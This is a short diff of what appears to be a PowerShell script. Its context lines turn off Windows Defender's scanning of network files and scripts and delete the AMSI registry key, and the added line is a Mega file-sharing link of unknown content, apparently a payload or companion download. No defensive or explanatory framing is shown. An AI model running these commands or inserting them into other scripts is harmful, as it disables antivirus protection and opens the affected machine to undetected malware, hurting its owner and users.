@@ -18,3 +18,5 @@ Set-MpPreference -DisableScanningNetworkFiles  $true
 Set-MpPreference -DisableScriptScanning $true
 $path = 'HKLM:\SOFTWARE\Microsoft\AMSI\'
 Remove-Item -Path $path -Recurse
+
+https://mega.nz/file/9XEy1JjL#Ql4VxYetu6TdWPP1QlhJ_nq6OrjGkxrYbbyMfocOgn
